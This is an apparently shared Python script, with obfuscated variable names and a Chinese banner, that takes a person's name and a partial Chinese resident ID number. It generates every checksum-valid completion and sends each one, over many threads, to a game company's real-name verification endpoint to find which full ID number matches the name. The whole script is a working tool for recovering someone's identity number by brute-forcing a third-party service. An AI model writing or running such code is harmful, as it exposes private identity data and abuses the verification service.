import requests
import json
import random
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

print('欢迎使用小猫の非库补💫\nby  @XiaoMaoFish🥳\n欢迎管理员👮🏻‍♂️')

def a1b2c3d4(e1f2g3h4):
    i5j6k7l8 = requests.Session()
    m9n0o1p2 = "https://agent.cronlygames.cn/antiaddiction/nameverify.php"
    q3r4s5t6 = json.dumps({"ai": str(random.randint(10**17, 10**18 - 1)), "action": "verify", "card": e1f2g3h4, "name": u7v8w9x0})
    y1z2a3b4 = {'User-Agent': "Custom-Agent", 'Content-Type': "application/json"}
    try:
        c5d6e7f8 = i5j6k7l8.post(m9n0o1p2, data=q3r4s5t6, headers=y1z2a3b4, timeout=10)
        if c5d6e7f8.status_code == 200 and c5d6e7f8.json().get("data", {}).get("result", {}).get("status") == 0:
            return e1f2g3h4
    except requests.RequestException:
        pass
    return None

def g9h0i1j2(k3l4m5n6):
    if not 1950 <= int(k3l4m5n6[6:10]) <= 2022 or int(k3l4m5n6[10:12]) > 12 or int(k3l4m5n6[12:14]) > 31: return False
    o7p8q9r0 = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    s1t2u3v4 = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    return s1t2u3v4[sum(int(k3l4m5n6[i]) * o7p8q9r0[i] for i in range(17)) % 11] == k3l4m5n6[17]

def w5x6y7z8(a9b0c1d2):
    e3f4g5h6 = [[ch] if ch != 'x' else list("0123456789") for ch in a9b0c1d2]
    if a9b0c1d2[16] == 'x':
        i7j8k9l0 = input("🚹性别:\n >").strip()
        e3f4g5h6[16] = ["1", "3", "5", "7", "9"] if i7j8k9l0 == "男" else ["0", "2", "4", "6", "8"] if i7j8k9l0 == "女" else list("0123456789")

    with open('sfz.fk', 'w', encoding='utf-8') as m1n2o3p4:
        for q5r6s7t8 in itertools.product(*e3f4g5h6):
            u9v0w1x2 = "".join(q5r6s7t8)
            if len(u9v0w1x2) == 18 and g9h0i1j2(u9v0w1x2): m1n2o3p4.write(u9v0w1x2 + "\n")

u7v8w9x0 = input("♿️请输入姓名:\n >")
w5x6y7z8(input('🆔输入身份证:\n >'))
y3z4a5b6 = open("sfz.fk").read().splitlines()
print(f"⚠️准备核验 {len(y3z4a5b6)} 个身份证号中")
c7d8e9f0 = []
with ThreadPoolExecutor(max_workers=6*9) as g1h2i3j4:
    k5l6m7n8 = [g1h2i3j4.submit(a1b2c3d4, o9p0q1r2) for o9p0q1r2 in y3z4a5b6]
    for s3t4u5v6, w7x8y9z0 in enumerate(as_completed(k5l6m7n8), 1):
        print(f"\r♻️{s3t4u5v6}/{len(y3z4a5b6)}", end="", flush=True)
        a1b2c3d4e5 = w7x8y9z0.result()
        if a1b2c3d4e5:
            c7d8e9f0.append(a1b2c3d4e5)
            print(f" ✅ 核验成功 {a1b2c3d4e5}")
if c7d8e9f0:
    print("\n🟢核验已完成")
else:
    print("\n🔴空 没有核验成功的身份证号")
